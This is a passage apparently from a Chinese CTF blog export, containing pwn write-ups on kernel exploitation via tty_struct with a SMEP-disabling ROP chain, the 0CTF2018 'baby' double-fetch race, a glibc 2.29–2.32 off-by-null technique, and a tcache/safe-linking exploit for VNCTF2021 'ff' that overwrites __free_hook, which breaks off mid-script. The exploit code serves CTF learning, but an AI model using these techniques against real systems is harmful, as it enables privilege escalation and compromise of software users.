/hello.ko，再重新打包，通过qemu启动内核，启动命令为：\n\n```\n#注释头\n\nqemu-system-x86_64 \\\n-m 128M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr\" \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\n这里不能在append中添加quiet命令，否则没法打印出来\n\nC.之后就可以看到\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458400.jpeg)\n\n参照：[https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-%E5%88%9D%E6%8E%A2-1/](https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-初探-1/)\n\n(3)一般而言，修改cred结构体可以直接从头开始，将头部至gid的部分都赋值为0即可，因为前面的数据基本用不到，不需要再去找原始数据来赋值。\n\n二、利用ptmx设备中的tty_struct结构体\n\n1.前置知识：\n\n(1)打开设备，open(\"/dev/ptmx\", O_RDWR)时会创建一个tty_struct\n\n(2)tty_struct结构体中有一个const struct tty_operations *ops;结构体指针，偏移为xx。\n\n```\n//注释头\n\nstruct tty_struct {\n    int magic;\n    struct kref kref;\n    struct device *dev;\n    struct tty_driver *driver;\n    const struct tty_operations *ops;\n    int index;\n\n    /* Protects ldisc changes: Lock tty not pty */\n    struct ld_semaphore ldisc_sem;\n    struct tty_ldisc *ldisc;\n\n    struct mutex atomic_write_lock;\n    struct mutex legacy_mutex;\n    struct mutex throttle_mutex;\n    struct rw_semaphore termios_rwsem;\n    struct mutex winsize_mutex;\n    spinlock_t ctrl_lock;\n    spinlock_t flow_lock;\n    /* Termios values are protected by the termios rwsem */\n    struct ktermios termios, termios_locked;\n    struct termiox *termiox; /* May be NULL for unsupported */\n    char name[64];\n    struct pid *pgrp; /* Protected by ctrl lock */\n    struct pid *session;\n    unsigned long flags;\n    int count;\n    struct winsize winsize; /* winsize_mutex */\n    unsigned long stopped:1, /* flow_lock */\n        flow_stopped:1,\n        unused:BITS_PER_LONG - 2;\n    int hw_stopped;\n    unsigned long ctrl_status:8, /* ctrl_lock */\n        packet:1,\n        unused_ctrl:BITS_PER_LONG - 9;\n    unsigned int receive_room; /* Bytes free for queue */\n    int flow_change;\n\n    struct tty_struct *link;\n    struct fasync_struct *fasync;\n    int alt_speed; /* For magic substitution of 38400 bps */\n    wait_queue_head_t write_wait;\n    wait_queue_head_t read_wait;\n    struct work_struct hangup_work;\n    void *disc_data;\n    void *driver_data;\n    struct list_head tty_files;\n\n#define N_TTY_BUF_SIZE 4096\n\n    int closing;\n    unsigned char *write_buf;\n    int write_cnt;\n    /* If the tty has a pending do_SAK, queue it here - akpm */\n    struct work_struct SAK_work;\n    struct tty_port *port;\n};\n```\n\n结构体大小为0x2e0，但是不知道各个版本的大小是不是都一样，如果需要查看大小，仍然可以用上述方法，去网站，或者编译一个小module\n\n网站：https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h\n\nmodule：参照上面的，打印即可。\n\n(3)tty_operations结构体中有一个int (*write)(struct tty_struct * tty,\nconst unsigned char *buf, int count); 函数指针，这个函数在与ptmx设备进行交互，调用write函数时就会调用该函数。\n\n```\n//注释头\n\nstruct tty_operations {\n    struct tty_struct * (*lookup)(struct tty_driver *driver,\n    struct inode *inode, int idx);\n    int (*install)(struct tty_driver *driver, struct tty_struct *tty);\n    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);\n    int (*open)(struct tty_struct * tty, struct file * filp);\n    void (*close)(struct tty_struct * tty, struct file * filp);\n    void (*shutdown)(struct tty_struct *tty);\n    void (*cleanup)(struct tty_struct *tty);\n    int (*write)(struct tty_struct * tty,\n        const unsigned char *buf, int count);\n    int (*put_char)(struct tty_struct *tty, unsigned char ch);\n    void (*flush_chars)(struct tty_struct *tty);\n    int (*write_room)(struct tty_struct *tty);\n    int (*chars_in_buffer)(struct tty_struct *tty);\n    int (*ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    long (*compat_ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);\n    void (*throttle)(struct tty_struct * tty);\n    void (*unthrottle)(struct tty_struct * tty);\n    void (*stop)(struct tty_struct *tty);\n    void (*start)(struct tty_struct *tty);\n    void (*hangup)(struct tty_struct *tty);\n    int (*break_ctl)(struct tty_struct *tty, int state);\n    void (*flush_buffer)(struct tty_struct *tty);\n    void (*set_ldisc)(struct tty_struct *tty);\n    void (*wait_until_sent)(struct tty_struct *tty, int timeout);\n    void (*send_xchar)(struct tty_struct *tty, char ch);\n    int (*tiocmget)(struct tty_struct *tty);\n    int (*tiocmset)(struct tty_struct *tty,\n        unsigned int set, unsigned int clear);\n    int (*resize)(struct tty_struct *tty, struct winsize *ws);\n    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);\n    int (*get_icount)(struct tty_struct *tty,\n    struct serial_icounter_struct *icount);\n#ifdef CONFIG_CONSOLE_POLL\n    int (*poll_init)(struct tty_driver *driver, int line, char *options);\n    int (*poll_get_char)(struct tty_driver *driver, int line);\n    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);\n#endif\n    const struct file_operations *proc_fops;\n};\n```\n\n这个结构体在伪造的时候就可以随便伪造了，只要函数偏移位置对就行。\n\n(4)所以我们伪造一个tty_struct结构体fake_tty_1，利用UAF漏洞将一个堆块申请为这个结构体，修改其const struct tty_operations *ops;结构体指针指向另一个伪造的tty_operations结构体fake_tty_2。\n\n(5)将tty_operations结构体fake_tty_2中的int (*write)(struct tty_struct * tty,\nconst unsigned char *buf, int count); 函数指针指向ROP链，调用ROP，控制程序。\n\n(6)控制程序之后一般需要关闭掉smep保护，之后用ret2Usr来提权。\n\n▲关闭smep保护：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458313.jpeg)\n\n需要将CR4寄存器中的第20位置0，即可关闭。一般在ROP链中执行下列gadget即可：\n\n```\n#注释头\n\nmov cr4,0x6f0; ret;\n----------------------------------------------------------------------\npop rdi; ret\n0x6f0\nmov cr4,rdi; ret;\n```\n\n上面两种都行，或者其它满足条件的gadget也可以，这里0x6f0是想绕过一些机制。\n\n2.利用手段：\n\n(1)通过UAF申请得到tty_struct结构体指针，修改const struct tty_operations *ops使其指向用户空间伪造的tty_operations结构体，伪造的tty_operations结构体中的write指针指向ROP链。\n\n(2)ROP链进行迁移内核栈，关闭smep保护，正常ret2Usr。\n\n ","tags":["kernel-skill"],"categories":["pwn-kernel"]},{"title":"0CTF2018-baby(double-fetch)","url":"/2021/08/14/0CTF2018-baby(double-fetch)/","content":"\n只给了baby.ko和加载的文件系统core.cpio，没有内核和启动脚本，所以需要下载和配置。\n\n1.下载内核配置环境：\n\n(1)IDA打开baby.ko查看十六进制的汇编可以看到调用的Linux版本，可以下载源码编译或者直接下载编译好的。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-27_12-07-25.png)\n\n(2)解压得到压缩内核：\n\n```bash\n#注释头\n\napt search linux-image-[version]\napt download xxxx\nar -x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb\n```\n\n在./data/boot中有vmlinuz-4.15.0-22-generic，不要再类似压缩为bzImage，可以直接用来启动qemu。\n\n(3)配置文件系统和启动脚本：\n\n①文件系统：用busybox制作的，find ./* | cpio -H newc -o > rootfs.cpio\n\n![1](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png)\n\n②启动脚本和配置文件：\n\n![2](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png)\n\n```bash\n#! /bin/sh\nqemu-system-x86_64 \\\n-m 256M -smp 4,cores=2,threads=2 \\\n-kernel ./vmlinux \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokalsr\" \\\n-cpu qemu64 \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n#-gdb tcp::1234 \\\n# -S\n```\n\n \n\n2.开始解析baby.ko\n\n(1)两个实际命令，在baby_ioctl函数中：\n\n![3](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png)\n\n①0x6666命令可以得到flag在内核空间的地址\n\n②0x1337命令会触发三个检查，如果检查成功则可以打印出flag\n\n(2)漏洞点：\n\n漏洞在检查上，三个检查是检查通过ioctl传入的数据rdx。\n\n▲_chk_range_not_ok函数：将第一个参数rdi和第二个参数rsi相加，判断是否小于第三个参数rdx，如果大于等于将al置为1(al即rax的低8位寄存器)，如果小于则返回0，而如果要进入该if，则需要返回值为0，则需rdi+rsi < rdx。\n\n①检查一：_chk_range_not_ok(v2, 16LL, *(__readgsqword(&current_task) + 4952)其中的*(__readgsqword(&current_task) + 4952)其实是用户空间的起始地址：\n\n![4](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.png)\n\n即传入数据的地址加上16需要小于0x7ffffffff000，而小于0x7ffffffff000则表示处在用户空间中：\n\n![5](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png)\n\n那么就是检查传入的数据的地址是否位于用户空间。\n\n②检查二即将传入的数据作为一个结构体，检查该结构体中flag指针对应的数据的地址加上flag的长度是否位于用户空间。\n\n③检查三即检查flag的长度是否和程序中硬编码的长度相等。\n\n▲由于传入的结构体是由我们控制的，且过程中依据该结构体来索引flag，其中的flag指针我们也可以改变，所以如果在检查结束之后，打印flag之前，能够将flag指针指向内核空间真正的flag处，那么就能够通过：\n\n```c\n#注释头\n\nfor ( i = 0; i < strlen(flag); ++i )\n{\n    if ( *(*v5 + i) != flag[i] )\n    return 22LL;\n}\n```\n\n从而打印内核空间真正的flag了。而这个内核空间flag的地址可以通过命令0x6666得到，这样就类似于利用了一个条件竞争的漏洞。\n\n \n\n3.编写exp\n\n(1)首先是结构体：\n\n```\n#注释头\n\nstruct MyflagStruc\n{\n    char *flag;\n    size_t len;\n};\n```\n\n(2)接着打开dev获取地址:\n\n```\n#注释头\n\nint fd = open(\"/dev/baby\",O_RDONLY);\nioctl(fd,0x6666);\n\nsystem(\"dmesg > /tmp/record.txt\");\nallInfo_fd= open(\"/tmp/record.txt\",O_RDONLY);\nlseek(allInfo_fd,-0x1000,SEEK_END);\nread(allInfo_fd,buf,0x1000);\nclose(allInfo_fd);\nidx = strstr(buf,\"Your flag is at \");\nif (idx == 0){\n    printf(\"[-]Not found addr\");\n    exit(-1);\n}\nelse{\n    idx += 16;\n    kernelFlag_addr = strtoull(idx,idx+16,16);\n    printf(\"[+]kernelFlag_addr: %p\\n\",kernelFlag_addr);\n}\n```\n\n①关于dmesg，这个命令是获取从启动虚拟机开始的几乎所有的输出信息，所以如果我们打开baby这个dev，就能够得到里面printk函数的相关输出，然后把输出重定向到/tmp/record.txt这里面，再从record.txt中获取地址。同时由于是所有的输出信息，所以返回给我们的flag地址肯定是在最后面的，所以lseek(allInfo_fd,-0x1000,SEEK_END);从最后面往前获取0x1000个字节，然后再来用strstr获取子字符串索引，最后strtoull转换地址得到内核中flag的地址。\n\n![6](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.png)\n\n(3)然后创建线程，爆破修改数据中flag指向的地址。\n\n```\n#注释头\n\nMyflagStruc myflag;\nmyflag.len = 33;\nmyflag.flag = buf;\npthread_create(&myflag, NULL, change_attr_value,&myflag);\nfor(int i = 0; i < 0x1000; i ++){\n    ret = ioctl(fd, 0x1337, &myflag);\n    myflag.flag = buf;\n}\nfinish = 1;\npthread_join(myflag, NULL);\nclose(fd);\nputs(\"[+]result is :\");\nsystem(\"dmesg | grep flag\");\n```\n\n线程方面这涉及回调函数相关知识，自己补吧。\n\n(4)线程回调函数：修改flag指向内核的flag，从而能够通过逐字节验证\n\n```\n#注释头\n\nvoid changeFlagAddr(void *myflag){\n    while(finish==0){\n        myflag->flag = kernelFlag_addr ;\n    }\n}\n```\n\n \n\n4.一些注意事项：\n\n(1)头文件的注意事项，和写小程序一样，自己加。\n\n(2)线程注意事项：gcc编译时需要加上-lpthread参数，并且要静态编译。\n\n(3)输入输出重定向：我看很多exp都有关闭输入输出流的，但是我尝试了一下，不用关其实也可以，可能是对应的环境关系吧。\n\n```\n#注释头\n\nsetvbuf(stdin,0,2,0);\nsetvbuf(stdout,0,2,0);\nsetvbuf(stderr,0,2,0);\n```\n\n(4)文件传输模块：\n\n先转发一下启动程序：\n\n```\n#注释头\n\nsocat tcp-listen:30000,fork exec:./boot.sh,reuseaddr\n```\n\n可以用下列脚本，这个脚本参照这位师傅的：\n\nhttps://blog.csdn.net/seaaseesa/article/details/104537991\n\n```\n#注释头\n\n# coding:utf8\nfrom pwn import *\nimport base64\n \nsh = remote('127.0.0.1',30000)\n \n#exploit\nf = open('./exp','rb')\ncontent = f.read()\ntotal = len(content)\nf.close()\n\n# segment send\nper_length = 0x200;\n# touch file\nsh.sendlineafter('$ ','touch /tmp/exploit')\n\nlog.info(\"Total length:%d\"%total)\nfor i in range(0,total,per_length):\n   bstr = base64.b64encode(content[i:i+per_length])\n   sh.sendlineafter('$ ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))\n   print(i)\n   \nif total - i > 0:\n   bstr = base64.b64encode(content[total-i:total])\n   sh.sendlineafter('$ ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))\n \nsh.sendlineafter('$ ','chmod +x /tmp/exploit')\nsh.sendlineafter('$ ','/tmp/exploit')\nsh.interactive()\n```\n\n(5)调试模块：\n\n关于文件系统的选择方面，用精简版的Busybox开出来的qemu调试的时候获取加载模块的基地址总是出错，暂时不知道为什么后面补。\n\n但是可以用2018强网杯core的文件系统，加载之后调试的基地址没问题，这个在ctfwiki上有。\n\n \n\n","tags":["kernel题"],"categories":["pwn-kernel","Kernel_doubleFetch"]},{"title":"2.29-2.32下的off-by-null","url":"/2021/08/14/2.29-2.32下的off-by-null/","content":"\n最近发现一种对于高版本libc更好的方法，不用爆破，先贴下连接：\n\nhttps://www.anquanke.com/post/id/236078#h3-7\n\n而且这个可以说是通杀除了2.33版本的所有Libc，因为没用用到tcache和fastbin，这位大佬WJH师傅真是神仙。但是他的有些地方有点出入，刚开始调试的时候容易直接干蒙，所以这里总结一下。\n\n▲总的来说是运用unsortedbin来踩地址，然后再借用unsortedbin和Largebin加上off-by-null来修复fd，bk，从而能够通过新增的检查。这里我拿\n\n第三届山东新一代信息技术创新应用大赛 werewolf2，原题是2.27的，这里用2.31模拟一下。\n\n这道题来举例，题目不同chunk的索引对应变化。\n\n1.首先堆风水布局，让我们之后申请用来利用的chunk的后一个字节可控，就是得为0x00，方便off-by-null利用。\n\n```python\n#注释头\n\nadd(0x1000-0x8-0xf0,'padd')#0\n```\n\n这个堆布局看具体的环境，有的题上来先申请一堆堆块，容易搞蒙，d调一下就知道了。\n\n2.然后准备堆块，结合之前的堆布局，需要满足条件：\n\n```python\n#注释头\n\nadd(0x418,'\\x01'*0x410) #1 fd  0x---2b0\nadd(0x108,'\\x02*0x100') #2\nadd(0x418,'\\x03'*0x410) #3\nadd(0x438,'\\x04'*0x430) #4 unlink_chunk  0x---c00\nadd(0x108,'\\x05'*0x100) #5\nadd(0x428,'\\x06'*0x420) #6 bk  0x---150\nadd(0x208,'\\x07'*0x200) #7\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-18-35.png)\n\n其中0x108大小的堆块主要是辅助加隔离，然后0x428之类的几个不同大小是为切割unsortedbin来搞事。然后这里我申请了0x208大小的堆块，这个堆块的作用主要就是隔离和填充，然后原贴的大佬由于size位用到了\\x0a，是个换行符，Pwn中一般比骄敏感，容易无法发送，所以这里我多申请0x100，让之后的size位变成\\x0b，方便利用。\n\n3.然后就开始搞事，首先释放这几个chunk。\n\n```python\n#注释头\n\nfree(1)\nfree(4)\nfree(6)\nfree(3)\n```\n\n满足如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-33-40.png)\n\n释放顺序需要注意，要利用unsortedbin在0x---c00这个chunk上留下0x---2b0和0x---150的地址作为fd和bk，之后再修复fd->bk和bk->fd：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-48-19.png)\n\n其中两个chunk合并了组成了0x---7e0这个chunk，方便切割之后修改0x---c00的size位。\n\n4.之后申请chunk，从0x---7e0中申请切割，修改0x---c00的size位，同时会触发malloc_consolidate将0x---150和0x--2b0放入largebin中，这个没啥用，直接申请回来就可以了，主要是切割。\n\n```python\n#注释头\n\nadd(0x438, '\\x08'*0x418 + p64(0xb91)) #8 set size\nadd(0x418,'\\x09'*0x410) # 9     0x---c20\nadd(0x428,'\\x10'*0x420) # 10 bk 0x---150\nadd(0x418,'\\x11'*0x410) # 11 fd 0x---2b0\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-42-30.png)\n\n5.之后就开始修复fd和bk，利用0x---c20和对应的fd,bk，进入unsortedbin来修复。\n\n(1)修复fd:\n\n先释放0x---2b0，然后释放0x---c20，利用unsortedbin来给0x---2b0的bk踩上0x---c20的地址，然后申请回来，方便之后修复bk(0x---150)，同时将踩下的地址从0x---c20修改为0x---c00，即可修复成功。\n\n```python\n#注释头\n\nfree(11)  #0x---2b0\nfree(9)   #0x---c20\nadd(0x418, 'PIG007nb')  # 12 0x---c20 to overflow \\x00 in fd\nadd(0x418,'\\x13'*0x410) # 13 0x---c20\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-06-10.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-03-45.png)\n\n(2)修复bk：首先进入Unsortedbin中踩地址\n\n```python\n#注释头\n\nfree(13)\nfree(10)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-43-09.png)\n\n没啥问题 ，但是申请回来的时候有点大问题：\n\n①如果先申请0x---c20，那么就会使得unsortedbin中顺序变为：\n\n0x---150 -> main_arena+96，导致原先的0x---150.fd被修改，无法完成修复。\n\n②如果先申请0x---150，那么由于unsortedbin机制，依据fd遍历，就会先遍历到0x---c20，导致0x---c20解链放入largebin中，unsortedbin中的情况和先申请0x---c20是一样的，先变成0x---150 -> main_arena+96，然后才会返回0x---150，fd都会被改。\n\n▲所以先将这两个chunk放入largebin中，依据largebin的机制，由于这两个chunk的大小不同，直接申请对应大小就能得到对应的chunk，同时由于largebin排列依据从大到小，申请时也是先遍历大小再遍历fd，如果所需大小的链中只有该chunk，直接返回。所以就可以申请一个大chunk，将这两个chunk都放入largebin中，顺序为：\n\n```python\n#注释头\n\nadd(0x9F8,'\\x14') # 14 chunk into largebin\n```\n\n同时这个大chunk也是之后需要触发的off-by-null的chunk\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-52-36.png)\n\n之后再申请0x---150大小的chunk就能直接得到了，现在就修复完fd和bk了。\n\n```python\n#注释头\n\nadd(0x428, '') # 15 partial overwrite fd\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-56-22.png)\n\n6.最后用off-by-null来设置触发chunk的size位\n\n```python\n#注释头\n\nedit(7,'\\x77'*0x200+p64(0xb90))\nfree(14)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-08.png)\n\n满足所有条件，释放\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-27.png)\n\n可以看到top_chunk已经向上合并到0x---c00了，之后就具体的具体分析就完事了。\n\n▲最后贴个简单的exp，只是布局的：\n\n```python\n#注释头\n\nadd(0x1000-0x8-0xf0,'padd')#0\n\nadd(0x418,'\\x01'*0x410) #1 fd 0x---2b0\nadd(0x108,'\\x02*0x100') #2\nadd(0x418,'\\x03'*0x410) #3\nadd(0x438,'\\x04'*0x430) #4 unlink_chunk 0x---c00\nadd(0x108,'\\x05'*0x100) #5\nadd(0x428,'\\x06'*0x420) #6 bk 0x---150\nadd(0x208,'\\x07'*0x200) #7\n\n#left fd bk in 0x---c00\nfree(1)\nfree(4)\nfree(6)\n\n#merge and carve to get 0x---c20 and change size which in 0x---c00 \nfree(3)\nadd(0x438, '\\x08'*0x418 + p64(0xb91)) #8 set size\n\n#reply\nadd(0x418,'\\x09'*0x410) # 9 0x---c20\nadd(0x428,'\\x10'*0x420) # 10 bk 0x---150\nadd(0x418,'\\x11'*0x410) # 11 fd 0x---2b0\n\n#repair fd\nfree(11) #0x---2b0\nfree(9) #0x---c20\nadd(0x418, 'PIG007nb') # 12 0x---2b0 to overflow \\x00 in fd\nadd(0x418,'\\x13'*0x410) # 13 0x---c20\n\n\n#repair bk\nfree(13)\nfree(10)\nadd(0x9F8,'\\x14'*0x9f0) # let 0x---150 0x---c20 into largebin\nadd(0x428, '') # 15 0x---150 to overflow \\x00 in fd\n\n#trigger off-by-null\n#add(0x418,'\\x16'*0x410) # 16 c20\nedit(7,'\\x77'*0x200+p64(0xb90))\nfree(14)\n```\n\n \n","tags":["off-by-null"],"categories":["PWN","pwn堆-off-by-null"]},{"title":"2.32下的tcache利用-VNCTF2021 ff","url":"/2021/08/14/2.32下的tcache利用-VNCTF2021 ff/","content":"\n通过这题学习下2.32下的tcache，同时还学到好多东西。\n\n1.先解析下题目，大概是提供了分配、释放、编辑、打印堆块的功能，不过限制了只能打印一次、编辑两次，同时还限制了不能分配0x90及以上的堆块。然后释放功能指针没清空，有UAF，保护全开。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsJXQhGvoTieV14xa.png)\n\n2.首先泄露地址：因为2.32要利用doble-free必须泄露堆地址，所以show()功能肯定先被用掉，直接从free的chunk的fd指针泄露出heap_base，因为2.32的safe-linking异或机制就是下一个chunk和heap_base异或放入fd。\n\n那么就思考之后怎么泄露Libc地址，可以通过劫持IO来泄露，但是劫持IO也需要libc地址才行啊，这里就用到爆破，利用unsortebin来留下地址在tcache结构体上，然后部分写2个字节来爆破半个字节。因为IO和main_arena其实相距不是太远，调试就可以知道。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-01-47.png)\n\n```python\n#注释头\n\n#leak heap_base\nnew(0x80,'PIG007NB')\nfree()\nshow()\nheap_leak = u64(rc(5).ljust(8,'\\x00'))\nheap_base = heap_leak*0x1000\nlog.info(\"heap_base:0x%x\"%heap_base)\n\n#change key to make double free\nedit('PIG007NBPIG007NB')\nfree()\n\n#change 0x290(7) to free tcache(0x290) into unsortedbin\nedit(p64((heap_leak) ^ (heap_base + 0x10)))\nnew(0x80, 'PIG007NB')\nnew(0x80, '\\x00\\x00' *((0x290-0x20)/0x10) + '\\x07\\x00')\nfree()\n#--------------------------------------------\nnew(0x88, ('\\x00\\x00' + '\\x00\\x00' + '\\x02\\x00' + '\\x00\\x00' + '\\x00\\x00' * 2 + '\\x01\\x00').ljust(0x88, '\\x00'))\n#--------------------------------------------\n```\n\n被#---------------------------包裹起来的部分，这里只能申请0x48或者0x88大小的，因为tcache结构体被破坏，很多bin的数量变大了，不再是0x0，但是tcache中对应的Bin链表中仍然是0x0，再申请对应大小的就会触发程序异常，其实就是放入tcache空闲bin链表的时候错误：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-09.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-31.png)\n\n3.然后就是劫持IO泄露地址:\n\n```python\n#注释头\n\nnew(0x18,p64(heap_base+0x330)+'\\xbb') #will be used later\nnew(0x18,p16(0x66c0))\nnew(0x78,p64(0xfbad1800) + p64(0)*3 + p64(heap_base+0xa8)+p64(heap_base+0xb0)+p64(heap_base+0xb0))\n\n#new(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n#this will be OK\nmain_arena = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00')) - 0xbb - 96\ntest = main_arena>>40\nlog.info(\"main_arena:0x%x\"%main_arena)\nlog.info(\"test:0x%x\"%test)\nif(test != 0x7f):\n    return\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\n#stdout_addr = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00'))-132\n# log.info(\"stdout_addr:0x%x\"%stdout_addr)\n# obj = LibcSearcher(\"_IO_2_1_stdout_\", stdout_addr)\n# libc_base = stdout_addr-obj.dump('_IO_2_1_stdout_')\n\nsystem_addr = libc_base + obj.dump(\"system\")\n__free_hook_addr = libc_base + obj.dump(\"__free_hook\")\n\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"__free_hook_addr:0x%x\"%__free_hook_addr)\n```\n\n4.最后就是填充，将unsortedbin申请完之后，将unsortedbin从Tcache的结构体中脱离出来，防止再申请的时候乱套。这里直接从topchunk申请，安全一点。\n\n```python\n#注释头\n\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x18,'PIG007NB')\nnew(0x18,'PIG007NB')\n\n\n#one_gadget = libc_base + 0xdf54c\nnew(0x88, p64(__free_hook_addr^(heap_base/0x1000)))\nnew(0x38, p64(system_addr))\nnew(0x38, p64(system_addr))\n\nnew(0x10, b'/bin/sh\\x00')\npause()\nfree()\np.interactive()\n```\n\n5.最后贴个爆破的exp，有些借鉴了arttnba3师傅的：\n\nhttps://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/\n\n```python\n#注释头\n\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./pwn\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"libc_base:0x%x\"%libc_base)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so  \n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n    #p = process(['./ld-2.32.so', './pwn'], env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n\ndef cmd(command):\n    p.recvuntil(b\">>\")\n    p.sendline(str(command).encode())\n\ndef new(size, content):\n    cmd(1)\n    p.recvuntil(b\"Size:\")\n    p.sendline(str(size).encode())\n    p.recvuntil(b\"Content:\")\n    p.send(content)\n\ndef free():\n    cmd(2)\n\ndef show():\n    cmd(3)\n\ndef edit(content):\n    cmd(5)\n    p.recvuntil(b\"Content:\")\n    p.send(content)\n\ndef exp():\n\n    #leak heap_base\n    new(0x80,'PIG007NB')\n    free()\n    show()\n    heap_leak = u64(rc(5).ljust(8,'\\x00'))\n    heap_base = heap_leak*0x1000\n    log.info(\"heap_base:0x%x\"%heap_base)\n\n    #change key to make double free\n    edit('PIG007NBPIG007NB')\n    free()\n\n    #change 0x290(7) to free tcache(0x290) into unsortedbin\n    edit(p64((heap_leak) ^ (heap_base + 0x10)))\n    new(0x80, 'PIG007NB')\n    new(0x80, '\\x00\\x00' *((0x290-0x20)/0x10) + '\\x07\\x00')\n    free()\n    #--------------------------------------------\n    new(0x88, ('\\x00\\x00' + '\\x00\\x00' + '\\x02\\x00' + '\\x00\\x00' + '\\x00\\x00' * 2 + '\\x01\\x00').ljust(0x88, 